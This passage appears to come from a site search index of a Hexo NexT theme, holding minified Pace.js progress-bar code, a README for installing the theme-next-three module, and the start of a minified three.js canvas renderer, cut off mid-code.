c,d,e;if(null!=(null!=(d=this.bindings)?d[a]:void 0)){if(null==b)return delete this.bindings[a];for(c=0,e=[];c<this.bindings[a].length;)e.push(this.bindings[a][c].handler===b?this.bindings[a].splice(c,1):c++);return e}},a.prototype.trigger=function(){var a,b,c,d,e,f,g,h,i;if(c=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],null!=(g=this.bindings)?g[c]:void 0){for(e=0,i=[];e<this.bindings[c].length;)h=this.bindings[c][e],d=h.handler,b=h.ctx,f=h.once,d.apply(null!=b?b:this,a),i.push(f?this.bindings[c].splice(e,1):e++);return i}},a}(),j=window.Pace||{},window.Pace=j,v(j,g.prototype),D=j.options=v({},u,window.paceOptions,x()),U=[\"ajax\",\"document\",\"eventLag\",\"elements\"],Q=0,S=U.length;S>Q;Q++)K=U[Q],D[K]===!0&&(D[K]=u[K]);i=function(a){function b(){return V=b.__super__.constructor.apply(this,arguments)}return Z(b,a),b}(Error),b=function(){function a(){this.progress=0}return a.prototype.getElement=function(){var a;if(null==this.el){if(a=document.querySelector(D.target),!a)throw new i;this.el=document.createElement(\"div\"),this.el.className=\"pace pace-active\",document.body.className=document.body.className.replace(/pace-done/g,\"\"),document.body.className+=\" pace-running\",this.el.innerHTML='<div class=\"pace-progress\">\\n  <div class=\"pace-progress-inner\"></div>\\n</div>\\n<div class=\"pace-activity\"></div>',null!=a.firstChild?a.insertBefore(this.el,a.firstChild):a.appendChild(this.el)}return this.el},a.prototype.finish=function(){var a;return a=this.getElement(),a.className=a.className.replace(\"pace-active\",\"\"),a.className+=\" pace-inactive\",document.body.className=document.body.className.replace(\"pace-running\",\"\"),document.body.className+=\" pace-done\"},a.prototype.update=function(a){return this.progress=a,this.render()},a.prototype.destroy=function(){try{this.getElement().parentNode.removeChild(this.getElement())}catch(a){i=a}return this.el=void 0},a.prototype.render=function(){var a,b,c,d,e,f,g;if(null==document.querySelector(D.target))return!1;for(a=this.getElement(),d=\"translate3d(\"+this.progress+\"%, 0, 0)\",g=[\"webkitTransform\",\"msTransform\",\"transform\"],e=0,f=g.length;f>e;e++)b=g[e],a.children[0].style[b]=d;return(!this.lastRenderedProgress||this.lastRenderedProgress|0!==this.progress|0)&&(a.children[0].setAttribute(\"data-progress-text\",\"\"+(0|this.progress)+\"%\"),this.progress>=100?c=\"99\":(c=this.progress<10?\"0\":\"\",c+=0|this.progress),a.children[0].setAttribute(\"data-progress\",\"\"+c)),this.lastRenderedProgress=this.progress},a.prototype.done=function(){return this.progress>=100},a}(),h=function(){function a(){this.bindings={}}return a.prototype.trigger=function(a,b){var c,d,e,f,g;if(null!=this.bindings[a]){for(f=this.bindings[a],g=[],d=0,e=f.length;e>d;d++)c=f[d],g.push(c.call(this,b));return g}},a.prototype.on=function(a,b){var c;return null==(c=this.bindings)[a]&&(c[a]=[]),this.bindings[a].push(b)},a}(),P=window.XMLHttpRequest,O=window.XDomainRequest,N=window.WebSocket,w=function(a,b){var c,d,e;e=[];for(d in b.prototype)try{e.push(null==a[d]&&\"function\"!=typeof b[d]?\"function\"==typeof Object.defineProperty?Object.defineProperty(a,d,{get:function(){return b.prototype[d]},configurable:!0,enumerable:!0}):a[d]=b.prototype[d]:void 0)}catch(f){c=f}return e},A=[],j.ignore=function(){var a,b,c;return b=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],A.unshift(\"ignore\"),c=b.apply(null,a),A.shift(),c},j.track=function(){var a,b,c;return b=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],A.unshift(\"track\"),c=b.apply(null,a),A.shift(),c},J=function(a){var b;if(null==a&&(a=\"GET\"),\"track\"===A[0])return\"force\";if(!A.length&&D.ajax){if(\"socket\"===a&&D.ajax.trackWebSockets)return!0;if(b=a.toUpperCase(),$.call(D.ajax.trackMethods,b)>=0)return!0}return!1},k=function(a){function b(){var a,c=this;b.__super__.constructor.apply(this,arguments),a=function(a){var b;return b=a.open,a.open=function(d,e){return J(d)&&c.trigger(\"request\",{type:d,url:e,request:a}),b.apply(a,arguments)}},window.XMLHttpRequest=function(b){var c;return c=new P(b),a(c),c};try{w(window.XMLHttpRequest,P)}catch(d){}if(null!=O){window.XDomainRequest=function(){var b;return b=new O,a(b),b};try{w(window.XDomainRequest,O)}catch(d){}}if(null!=N&&D.ajax.trackWebSockets){window.WebSocket=function(a,b){var d;return d=null!=b?new N(a,b):new N(a),J(\"socket\")&&c.trigger(\"request\",{type:\"socket\",url:a,protocols:b,request:d}),d};try{w(window.WebSocket,N)}catch(d){}}}return Z(b,a),b}(h),R=null,y=function(){return null==R&&(R=new k),R},I=function(a){var b,c,d,e;for(e=D.ajax.ignoreURLs,c=0,d=e.length;d>c;c++)if(b=e[c],\"string\"==typeof b){if(-1!==a.indexOf(b))return!0}else if(b.test(a))return!0;return!1},y().on(\"request\",function(b){var c,d,e,f,g;return f=b.type,e=b.request,g=b.url,I(g)?void 0:j.running||D.restartOnRequestAfter===!1&&\"force\"!==J(f)?void 0:(d=arguments,c=D.restartOnRequestAfter||0,\"boolean\"==typeof c&&(c=0),setTimeout(function(){var b,c,g,h,i,k;if(b=\"socket\"===f?e.readyState<2:0<(h=e.readyState)&&4>h){for(j.restart(),i=j.sources,k=[],c=0,g=i.length;g>c;c++){if(K=i[c],K instanceof a){K.watch.apply(K,d);break}k.push(void 0)}return k}},c))}),a=function(){function a(){var a=this;this.elements=[],y().on(\"request\",function(){return a.watch.apply(a,arguments)})}return a.prototype.watch=function(a){var b,c,d,e;return d=a.type,b=a.request,e=a.url,I(e)?void 0:(c=\"socket\"===d?new n(b):new o(b),this.elements.push(c))},a}(),o=function(){function a(a){var b,c,d,e,f,g,h=this;if(this.progress=0,null!=window.ProgressEvent)for(c=null,a.addEventListener(\"progress\",function(a){return h.progress=a.lengthComputable?100*a.loaded/a.total:h.progress+(100-h.progress)/2},!1),g=[\"load\",\"abort\",\"timeout\",\"error\"],d=0,e=g.length;e>d;d++)b=g[d],a.addEventListener(b,function(){return h.progress=100},!1);else f=a.onreadystatechange,a.onreadystatechange=function(){var b;return 0===(b=a.readyState)||4===b?h.progress=100:3===a.readyState&&(h.progress=50),\"function\"==typeof f?f.apply(null,arguments):void 0}}return a}(),n=function(){function a(a){var b,c,d,e,f=this;for(this.progress=0,e=[\"error\",\"open\"],c=0,d=e.length;d>c;c++)b=e[c],a.addEventListener(b,function(){return f.progress=100},!1)}return a}(),d=function(){function a(a){var b,c,d,f;for(null==a&&(a={}),this.elements=[],null==a.selectors&&(a.selectors=[]),f=a.selectors,c=0,d=f.length;d>c;c++)b=f[c],this.elements.push(new e(b))}return a}(),e=function(){function a(a){this.selector=a,this.progress=0,this.check()}return a.prototype.check=function(){var a=this;return document.querySelector(this.selector)?this.done():setTimeout(function(){return a.check()},D.elements.checkInterval)},a.prototype.done=function(){return this.progress=100},a}(),c=function(){function a(){var a,b,c=this;this.progress=null!=(b=this.states[document.readyState])?b:100,a=document.onreadystatechange,document.onreadystatechange=function(){return null!=c.states[document.readyState]&&(c.progress=c.states[document.readyState]),\"function\"==typeof a?a.apply(null,arguments):void 0}}return a.prototype.states={loading:0,interactive:50,complete:100},a}(),f=function(){function a(){var a,b,c,d,e,f=this;this.progress=0,a=0,e=[],d=0,c=C(),b=setInterval(function(){var g;return g=C()-c-50,c=C(),e.push(g),e.length>D.eventLag.sampleCount&&e.shift(),a=q(e),++d>=D.eventLag.minSamples&&a<D.eventLag.lagThreshold?(f.progress=100,clearInterval(b)):f.progress=100*(3/(a+3))},50)}return a}(),m=function(){function a(a){this.source=a,this.last=this.sinceLastUpdate=0,this.rate=D.initialRate,this.catchup=0,this.progress=this.lastProgress=0,null!=this.source&&(this.progress=F(this.source,\"progress\"))}return a.prototype.tick=function(a,b){var c;return null==b&&(b=F(this.source,\"progress\")),b>=100&&(this.done=!0),b===this.last?this.sinceLastUpdate+=a:(this.sinceLastUpdate&&(this.rate=(b-this.last)/this.sinceLastUpdate),this.catchup=(b-this.progress)/D.catchupTime,this.sinceLastUpdate=0,this.last=b),b>this.progress&&(this.progress+=this.catchup*a),c=1-Math.pow(this.progress/100,D.easeFactor),this.progress+=c*this.rate*a,this.progress=Math.min(this.lastProgress+D.maxProgressPerFrame,this.progress),this.progress=Math.max(0,this.progress),this.progress=Math.min(100,this.progress),this.lastProgress=this.progress,this.progress},a}(),L=null,H=null,r=null,M=null,p=null,s=null,j.running=!1,z=function(){return D.restartOnPushState?j.restart():void 0},null!=window.history.pushState&&(T=window.history.pushState,window.history.pushState=function(){return z(),T.apply(window.history,arguments)}),null!=window.history.replaceState&&(W=window.history.replaceState,window.history.replaceState=function(){return z(),W.apply(window.history,arguments)}),l={ajax:a,elements:d,document:c,eventLag:f},(B=function(){var a,c,d,e,f,g,h,i;for(j.sources=L=[],g=[\"ajax\",\"elements\",\"document\",\"eventLag\"],c=0,e=g.length;e>c;c++)a=g[c],D[a]!==!1&&L.push(new l[a](D[a]));for(i=null!=(h=D.extraSources)?h:[],d=0,f=i.length;f>d;d++)K=i[d],L.push(new K(D));return j.bar=r=new b,H=[],M=new m})(),j.stop=function(){return j.trigger(\"stop\"),j.running=!1,r.destroy(),s=!0,null!=p&&(\"function\"==typeof t&&t(p),p=null),B()},j.restart=function(){return j.trigger(\"restart\"),j.stop(),j.start()},j.go=function(){var a;return j.running=!0,r.render(),a=C(),s=!1,p=G(function(b,c){var d,e,f,g,h,i,k,l,n,o,p,q,t,u,v,w;for(l=100-r.progress,e=p=0,f=!0,i=q=0,u=L.length;u>q;i=++q)for(K=L[i],o=null!=H[i]?H[i]:H[i]=[],h=null!=(w=K.elements)?w:[K],k=t=0,v=h.length;v>t;k=++t)g=h[k],n=null!=o[k]?o[k]:o[k]=new m(g),f&=n.done,n.done||(e++,p+=n.tick(b));return d=p/e,r.update(M.tick(b,d)),r.done()||f||s?(r.update(100),j.trigger(\"done\"),setTimeout(function(){return r.finish(),j.running=!1,j.trigger(\"hide\")},Math.max(D.ghostTime,Math.max(D.minTime-(C()-a),0)))):c()})},j.start=function(a){v(D,a),j.running=!0;try{r.render()}catch(b){i=b}return document.querySelector(\".pace\")?(j.trigger(\"start\"),j.go()):setTimeout(j.start,50)},\"function\"==typeof define&&define.amd?define([\"pace\"],function(){return j}):\"object\"==typeof exports?module.exports=j:D.startOnPageLoad&&j.start()}).call(this);"},{"url":"/lib/three/README.html","content":"<h1 align=\"center\"><a href=\"https://github.com/mrdoob/three.js\">JavaScript 3D library</a> for <a href=\"https://github.com/theme-next\">NexT</a></h1>\n\n<h1 align=\"center\">Installation</h1>\n\n<h2>If you want to use the CDN instead of clone this repo, please jump to the Step 3.</h2>\n\n<h2 align=\"center\">Step 1 &rarr; Go to NexT dir</h2>\n\nChange dir to **NexT** directory. There must be `layout`, `source`, `languages` and other directories:\n\n```sh\n$ cd themes/next\n$ ls\n_config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  package.json  README.md  scripts  source\n```\n\n<h2 align=\"center\">Step 2 &rarr; Get module</h2>\n\nInstall module to `source/lib` directory:\n\n```sh\n$ git clone https://github.com/theme-next/theme-next-three source/lib/three\n```\n\n<h2 align=\"center\">Step 3 &rarr; Set it up</h2>\n\nEnable module in **NexT** `_config.yml` file:\n\n```yml\nthree_waves: true\nOR\ncanvas_lines: true\nOR\ncanvas_sphere: true\n```\n\n**And, if you wants to use the CDN, then need to set:**\n\n```yml\nvendors:\n  ...\n  three: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js\n  three_waves: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js\n  canvas_lines: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_lines.min.js\n  canvas_sphere: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_sphere.min.js\n```\n\n<h1 align=\"center\">Update</h1>\n\n```sh\n$ cd themes/next/source/lib/three\n$ git pull\n```\n"},{"url":"/lib/three/canvas_lines.min.js","content":"THREE.SpriteCanvasMaterial=function(e){THREE.Material.call(this),this.type=\"SpriteCanvasMaterial\",this.color=new THREE.Color(16777215),this.program=function(e,t){},this.setValues(e)},THREE.SpriteCanvasMaterial.prototype=Object.create(THREE.Material.prototype),THREE.SpriteCanvasMaterial.prototype.constructor=THREE.SpriteCanvasMaterial,THREE.SpriteCanvasMaterial.prototype.clone=function(){var e=new THREE.SpriteCanvasMaterial;return e.copy(this),e.color.copy(this.color),e.program=this.program,e},THREE.CanvasRenderer=function(e){console.log(\"THREE.CanvasRenderer\",THREE.REVISION),e=e||{};var s,l,c,p,E,d,h,f,u,m,v,x,R,y,T,w,H,g,S,M=this,b=new THREE.Projector,r=void 0!==e.canvas?e.canvas:document.createElement(\"canvas\"),C=r.width,z=r.height,V=Math.floor(C/2),j=Math.floor(z/2),L=0,O=0,B=C,W=z,n=1,P=r.getContext(\"2d\",{alpha:!0===e.alpha}),i=new THREE.Color(0),o=!0===e.alpha?0:1,a=1,k=0,N=null,F=null,A=null,I=null,D=null,t=[],G=(new THREE.RenderableVertex,new THREE.RenderableVertex,new THREE.Color),U=(new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color,new THREE.Color),q=new THREE.Color,X=new THREE.Color,J={},Y=new THREE.Box2,$=new THREE.Box2,K=new THREE.Box2,Q=new THREE.Color,Z=new THREE.Color,_=new THREE.Color,ee=new THREE.Vector3,te=new THREE.Vector3,ie=new THREE.Vector3,re=new THREE.Matrix3;function ne(e,t,i){de(i.opacity),he(i.blending);var r=t.scale.x*V,n=t.scale.y*j,o=.5*Math.sqrt(r*r+n*n);if(K.min.set(e.x-o,e.y-o),K.max.set(e.x+o,e.y+o),i instanceof THREE.SpriteMaterial){var a=i.map;if(null!==a){var s=J[a.id];if(void 0!==s&&s.version===a.version||(s=ce(a),J[a.id]=s),void 0!==s.canvas){xe(s.canvas);var l=a.image,c=l.width*a.offset.x,p=l.height*a.offset.y,E=l.width*a.repeat.x,d=l.height*a.repeat.y,h=r/E,f=n/d;P.save(),P.translate(e.x,e.y),0!==i.rotation&&P.rotate(i.rotation),P.translate(-r/2,-n/2),P.scale(h,f),P.translate(-c,-p),P.fillRect(c,p,E,d),P.restore()}}else xe(i.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==i.rotation&&P.rotate(i.rotation),P.scale(r,-n),P.fillRect(-.5,-.5,1,1),P.restore()}else i instanceof THREE.SpriteCanvasMaterial&&(ve(i.color.getStyle()),xe(i.color.getStyle()),P.save(),P.translate(e.x,e.y),0!==i.rotation&&P.rotate(i.rotation),P.scale(r,n),i.program(P),P.restore())}function oe(e,t,i,r){if(de(r.opacity),he(r.blending),P.beginPath(),P.moveTo(e.positionScreen.x,e.positionScreen.y),P.lineTo(t.positionScreen.x,t.positionScreen.y),r instanceof THREE.LineBasicMaterial){if(fe(r.linewidth),ue(r.linecap),me(r.linejoin),r.vertexColors!==THREE.VertexColors)ve(r.color.getStyle());else{var n=i.vertexColors[0].getStyle(),o=i.vertexColors[1].getStyle();if(n===o)ve(n);else{try{var a=P.createLinearGradient(e.positionScreen.x,e.positionScreen.y,t.positionScreen.x,t.positionScreen.y);a.addColorStop(0,n),a.addColorStop(1,o)}catch(e){a=n}ve(a)}}P.stroke(),K.expandByScalar(2*r.linewidth)}else r instanceof THREE.LineDashedMaterial&&(fe(r.linewidth),ue(r.linecap),me(r.linejoin),ve(r.color.getStyle()),Re([r.dashSize,r.gapSize]),P.stroke(),K.expandByScalar(2*r.linewidth),Re([]))}function ae(e,t,i,r,n,o,a,s){if(M.info.render.vertices+=3,M.info.render.faces++,de(s.opacity),he(s.blending),h=e.positionScreen.x,f=e.positionScreen.y,u=t.positionScreen.x,m=t.positionScreen.y,v=i.positionScreen.x,x=i.positionScreen.y,function(e,t,i,r,n,o){P.beginPath(),P.moveTo(e,t),P.lineTo(i,r),P.lineTo(n,o),P.closePath()}(h,f,u,m,v,x),(s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial)&&null===s.map)U.copy(s.color),q.copy(s.emissive),s.vertexColors===THREE.FaceColors&&U.multiply(a.color),G.copy(Q),te.copy(e.positionWorld).add(t.positionWorld).add(i.positionWorld).divideScalar(3),function(e,t,i){for(var r=0,n=c.length;r<n;r++){var o=c[r];if(X.copy(o.color),o instanceof THREE.DirectionalLight){var a=ee.setFromMatrixPosition(o.matrixWorld).normalize();if((s=t.dot(a))<=0)continue;s*=o.intensity,i.add(X.multiplyScalar(s))}else if(o instanceof THREE.PointLight){var s;a=ee.setFromMatrixPosition(o.matrixWorld);if((s=t.dot(ee.subVectors(a,e).normalize()))<=0)continue;if(0==(s*=0==o.distance?1:1-Math.min(e.distanceTo(a)/o.distance,1)))continue;s*=o.intensity,i.add(X.multiplyScalar(s))}}}(te,a.normalModel,G),G.multiply(U).add(q),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G);else if(s instanceof THREE.MeshBasicMaterial||s instanceof THREE.MeshLambertMaterial||s instanceof THREE.MeshPhongMaterial){if(null!==s.map)s.map.mapping===THREE.UVMapping&&(R=a.uvs,pe(h,f,u,m,v,x,R[r].x,R[r].y,R[n].x,R[n].y,R[o].x,R[o].y,s.map));else null!==s.envMap?s.envMap.mapping===THREE.SphericalReflectionMapping&&(ie.copy(a.vertexNormalsModel[r]).applyMatrix3(re),y=.5*ie.x+.5,T=.5*ie.y+.5,ie.copy(a.vertexNormalsModel[n]).applyMatrix3(re),w=.5*ie.x+.5,H=.5*ie.y+.5,ie.copy(a.vertexNormalsModel[o]).applyMatrix3(re),g=.5*ie.x+.5,S=.5*ie.y+.5,pe(h,f,u,m,v,x,y,T,w,H,g,S,s.envMap)):(G.copy(s.color),s.vertexColors===THREE.FaceColors&&G.multiply(a.color),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G))}else s instanceof THREE.MeshNormalMaterial?(ie.copy(a.normalModel).applyMatrix3(re),G.setRGB(ie.x,ie.y,ie.z).multiplyScalar(.5).addScalar(.5)):G.setRGB(1,1,1),!0===s.wireframe?se(G,s.wireframeLinewidth,s.wireframeLinecap,s.wireframeLinejoin):le(G)}function se(e,t,i,r){fe(t),ue(i),me(r),ve(e.getStyle()),P.stroke(),K.expandByScalar(2*t)}function le(e){xe(e.getStyle()),P.fill()}function ce(e){if(0===e.version||e instanceof THREE.CompressedTexture||e instanceof THREE.DataTexture)return{canvas:void 0,version:e.version};var t=e.image;if(!1===t.complete)return{canvas:void 0,version:0};var i=e.wrapS===THREE.RepeatWrapping||e.wrapS===THREE.MirroredRepeatWrapping,r=e.wrapT===THREE.RepeatWrapping||e.wrapT===THREE.MirroredRepeatWrapping,n=e.wrapS===THREE.MirroredRepeatWrapping,o=e.wrapT===THREE.MirroredRepeatWrapping,a=document.createElement(\"canvas\");a.width=t.width*(n?2:1),a.height=t.height*(o?2:1);var s=a.getContext(\"2d\");s.setTransform(1,0,0,-1,0,t.height),s.drawImage(t,0,0),!0==n&&(s.setTransform(-1,0,0,-1,t.width,t.height),s.drawImage(t,-t.width,0)),!0==o&&(s.setTransform(1,0,0,1,0,0),s.drawImage(t,0,t.height)),!0==n&&!0==o&&(s.setTransform(-1,0,0,1,t.width,0),s.drawImage(t,-t.width,t.height));var l=\"no-repeat\";!0==i&&!0==r?l=\"repeat\":!0==i?l=\"repeat-x\":!0==r&&(l=\"repeat-y\");var c=P.createPattern(a,l);return e.onUpdate&&e.onUpdate(e),{canvas:c,version:e.version}}function pe(e,t,i,r,n,o,a,s,l,c,p,E,d){var h=J[d.id];if(void 0!==h&&h.version===d.version||(h=ce(d),J[d.id]=h),void 0===h.canvas)return xe(\"rgba( 0, 0, 0, 1)\"),void P.fill();xe(h.canvas);var f,u,m,v,x,R,y,T,w=d.offset.x/d.repeat.x,H=d.offset.y/d.repeat.y,g=d.image.width*d.repeat.x,S=d.image.height*d.repeat.y;l=(l+w)*g,c=(c+H)*S,p=(p+w)*g,E=(E+H)*S,i-=e,r-=t,n-=e,o-=t,0!=(y=(l-=a=(a+w)*g)*(E-=s=(s+H)*S)-(p-=a)*(c-=s))&&(x=e-(f=(E*i-c*n)*(T=1/y))*a-(m=(l*n-p*i)*T)*s,R=t-(u=(E*r-c*o)*T)*a-(v=(l*o-p*r)*T)*s,P.save(),P.transform(f,u,m,v,x,R),P.fill(),P.restore())}function Ee(e,t,i){var r,n=t.x-e.x,o=t.y-e.y,a=n*n+o*o;0!=a&&(n*=r=i/Math.sqrt(a),o*=r,t.x+=n,t.y+=o,e.x-=n,e.y-=o)}function de(e){a!==e&&(P.globalAlpha=e,a=e)}function he(e){k!==e&&(e===THREE.NormalBlending?P.globalCompositeOperation=\"source-over\":e===THREE.AdditiveBlending?P.globalCompositeOperation=\"lighter\":e===THREE.SubtractiveBlending?P.globalCompositeOperation=\"darker\":e===THREE.MultiplyBlending&&(P.globalCompositeOperation=\"multiply\"),k=e)}function fe(e){A!==e&&(P.lineWidth=e,A=e)}function ue(e){I!==e&&(P.lineCap=e,I=e)}function me(e){D!==e&&(P.lineJoin=e,D=e)}function ve(e){N!==e&&(P.strokeStyle=e,N=e)}function xe(e){F!==e&&(P.fillStyle=e,F=e)}function Re(e){t.length!==e.length&&(P.setLineDash(e),t=e)}void 0===P.setLineDash&&(P.setLineDash=function(){}),this.domElement=r,this.autoClear=!0,this.sortObjects=!0,this.sortElements=!0,this.info={render:{vertices:0,faces:0}},this.supportsVertexTextures=function(){},this.setFaceCulling=function(){},this.getContext=function(){return P},this.getContextAttributes=function(){return P.getContextAttributes()},this.getPixelRatio=function(){return n},this.setPixelRatio=function(e){void 0!==e&&(n=e)},this.setSize=function(e,t,i){C=e*n,z=t*n,r.width=C,r.height=z,V=Math.floor(C/2),j=Math.floor(z/2),!1!==i&&(r.style.width=e+\"px\",r.style.height=t+\"px\"),Y.min.set(-V,-j),Y.max.set(V,j),$.min.set(-V,-j),$.max.set(V,j),a=1,k=0,D=I=A=F=N=null,this.setViewport(0,0,e,t)},this.setViewport=function(e,t,i,r){L=e*n,O=t*n,B=i*n,W=r*n},this.setScissor=function(){},this.setScissorTest=function(){},this.setClearColor=function(e,t){i.set(e),o=void 0!==t?t:1,$.min.set(-V,-j),$.max.set(V,j)},this.setClearColorHex=function(e,t){console.warn(\"THREE.CanvasRenderer: .setClearColorHex() is being removed. Use .setClearColor() instead.\"),this.setClearColor(e,t)},this.getClearColor=function(){return i},this.getClearAlpha=function(){return o},this.getMaxAnisotropy=function(){return 0},this.clear=function(){!1===$.isEmpty()&&($.intersect(Y),$.expandByScalar(2),$.min.x=$.min.x+V,$.min.y=-$.min.y+j,$.max.x=$.max.x+V,$.max.y=-$.max.y+j,o<1&&P.clearRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0),0<o&&(he(THREE.NormalBlending),de(1),xe(\"rgba(\"+Math.floor(255*i.r)+\",\"+Math.floor(255*i.g)+\",\"+Math.floor(255*i.b)+\",\"+o+\")\"),P.fillRect(0|$.min.x,0|$.max.y,$.max.x-$.min.x|0,$.min.y-$.max.y|0)),$.makeEmpty())},this.clearColor=function(){},this.clearDepth=function(){},this.clearStencil=function(){},this.render=function(e,t){if(t instanceof THREE.Camera!=!1){var i=e.background;i&&i.isColor?(xe(\"rgb(\"+Math.floor(255*i.r)+\",\"+Math.floor(255*i.g)+\",\"+Math.floor(255*i.b)+\")\"),P.fillRect(0,0,C,z)):!0===this.autoClear&&this.clear(),M.info.render.vertices=0,M.info.render.faces=0,P.setTransform(B/C,0,0,-W/z,L,z-O),P.translate(V,j),s=b.projectScene(e,t,this.sortObjects,this.sortElements),l=s.elements,c=s.lights,t,re.getNormalMatrix(t.matrixWorldInverse),function(){Q.setRGB(0,0,0),Z.setRGB(0,0,0),_.setRGB(0,0,0);for(var e=0,t=c.length;e<t;e++){var i=c[e],r=i.color;i instanceof THREE.AmbientLight?Q.add(r):i instanceof THREE.DirectionalLight?Z.add(r):i instanceof THREE.PointLight&&_.add(r)}}();for(var r=0,n=l.length;r<n;r++){var o=l[r],a=o.material;if(void 0!==a&&0!==a.opacity){if(K.makeEmpty(),o instanceof THREE.RenderableSprite)(p=o).x*=V,p.y*=j,ne(p,o,a);else if(o instanceof THREE.RenderableLine)p=o.v1,E=o.v2,p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,K.setFromPoints([p.positionScreen,E.positionScreen]),!0===Y.intersectsBox(K)&&oe(p,E,o,a);else if(o instanceof THREE.RenderableFace){if(p=o.v1,E=o.v2,d=o.v3,p.positionScreen.z<-1||1<p.positionScreen.z)continue;if(E.positionScreen.z<-1||1<E.positionScreen.z)continue;if(d.positionScreen.z<-1||1<d.positionScreen.z)continue;p.positionScreen.x*=V,p.positionScreen.y*=j,E.positionScreen.x*=V,E.positionScreen.y*=j,d.positionScreen.x*=V,d.positionScreen.y*=j,0<a.overdraw&&(Ee(p.positionScreen,E.positionScreen,a.overdraw),Ee(E.positionScreen,d.positionScreen,a.overdraw),Ee(d.positionScreen,p.positionScreen,a.overdraw)),K.setFromPoints([p.positionScreen,E.positionScreen,d.positionScreen]),!0===Y.intersectsBox(K)&&ae(p,E,d,0,1,2,o,a)}$.union(K)}}P.setTransform(1,0,0,1,0,0)}else console.error(\"THREE.CanvasRenderer.render: camera is not an instance of THREE.Camera.\")}},THREE.RenderableObject=function(){this.id=0,this.object=null,this.z=0,this.renderOrder=0},THREE.RenderableFace=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.v3=new THREE.RenderableVertex,this.normalModel=new THREE.Vector3,this.vertexNormalsModel=[new THREE.Vector3,new THREE.Vector3,new THREE.Vector3],this.vertexNormalsLength=0,this.color=new THREE.Color,this.material=null,this.uvs=[new THREE.Vector2,new THREE.Vector2,new THREE.Vector2],this.z=0,this.renderOrder=0},THREE.RenderableVertex=function(){this.position=new THREE.Vector3,this.positionWorld=new THREE.Vector3,this.positionScreen=new THREE.Vector4,this.visible=!0},THREE.RenderableVertex.prototype.copy=function(e){this.positionWorld.copy(e.positionWorld),this.positionScreen.copy(e.positionScreen)},THREE.RenderableLine=function(){this.id=0,this.v1=new THREE.RenderableVertex,this.v2=new THREE.RenderableVertex,this.vertexColors=[new THREE.Color,new THREE.Color],this.material=null,this.z=0,this.renderOrder=0},THREE.RenderableSprite=function(){this.id=0,this.object=null,this.x=0,this.y=0,this.z=0,this.rotation=0,this.scale=new THREE.Vector2,this.material=null,this.renderOrder=0},THREE.Projector=function(){var K,Q,n,Z,_,ee,te,ie,re,ne,oe,ae=[],se=0,le=[],t=0,i=[],r=0,o=[],a=0,s=[],l=0,ce={objects:[],lights:[],elements:[]},pe=new THREE.Vector3,Ee=new THREE.Vector4,u=new THREE.Box3(new THREE.Vector3(-1,-1,-1),new THREE.Vector3(1,1,1)),m=new THREE.Box3,v=new Array(3),de=(new Array(4),new THREE.Matrix4),he=new THREE.Matrix4,fe=new THREE.Matrix4,ue=new THREE.Matrix3,me=new THREE.Frustum,ve=new THREE.Vector4,xe=new THREE.Vector4;this.projectVector=function(e,t){console.warn(\"THREE.Projector: .projectVector() is now vector.project().\"),e.project(t)},this.unprojectVector=function(e,t){console.warn(\"THREE.Projector: .unprojectVector() is now vector.unproject().\"),e.unproject(t)},this.pickingRay=function(e,t){console.error(\"THREE.Projector: .pickingRay() is now raycaster.setFromCamera().\")};var Re=new function(){var l=[],c=[],p=null,E=null,d=new THREE.Matrix3;function r(e){var t=e.position,i=e.positionWorld,r=e.positionScreen;i.copy(t).applyMatrix4(oe),r.copy(i).applyMatrix4(he);var n=1/r.w;r.x*=n,r.y*=n,r.z*=n,e.visible=-1<=r.x&&r.x<=1&&-1<=r.y&&r.y<=1&&-1<=r.z&&r.z<=1}function h(e,t,i){return!0===e.visible||!0===t.visible||!0===i.visible||(v[0]=e.positionScreen,v[1]=t.positionScreen,v[2]=i.positionScreen,u.intersectsBox(m.setFromPoints(v)))}function f(e,t,i){return(i.positionScreen.x-e.positionScreen.x)*(t.positionScreen.y-e.positionScreen.y)-(i.positionScreen.y-e.positionScreen.y)*(t.positionScreen.x-e.positionScreen.x)<0}return{setObject:function(e){E=(p=e).material,d.getNormalMatrix(p.matrixWorld),l.length=0,c.length=0},projectVertex:r,checkTriangleVisibility:h,checkBackfaceCulling:f,pushVertex:function(e,t,i){(n=ye()).position.set(e,t,i),r(n)},pushNormal:function(e,t,i){l.push(e,t,i)},pushUv:function(e,t){c.push(e,t)},pushLine:function(e,t){var i=le[e],r=le[t];(te=we()).id=p.id,te.v1.copy(i),te.v2.copy(r),te.z=(i.positionScreen.z+r.positionScreen.z)/2,te.renderOrder=p.renderOrder,te.material=p.material,ce.elements.push(te)},pushTriangle:function(e,t,i){var r=le[e],n=le[t],o=le[i];if(!1!==h(r,n,o)&&(E.side===THREE.DoubleSide||!0===f(r,n,o))){(_=Te()).id=p.id,_.v1.copy(r),_.v2.copy(n),_.v3.copy(o),_.z=(r.positionScreen.z+n.positionScreen.z+o.positionScreen.z)/3,_.renderOrder=p.renderOrder,_.normalModel.fromArray(l,3*e),_.normalModel.applyMatrix3(d).normalize();for(var a=0;a<3;a++){var s=_.vertexNormalsModel[a];s.fromArray(l,3*arguments[a]),s.applyMatrix3(d).normalize(),_.uvs[a].fromArray(c,2*arguments[a])}_.vertexNormalsLength=3,_.material=p.material,ce.elements.push(_)}}}};function ye(){if(Z!==t)return le[Z++];var e=new THREE.RenderableVertex;return le.push(e),t++,Z++,e}function Te(){if(ee!==r)return i[ee++];var e=new THREE.RenderableFace;return i.push(e),r++,ee++,e}function we(){if(ie!==a)return o[ie++];var e=new 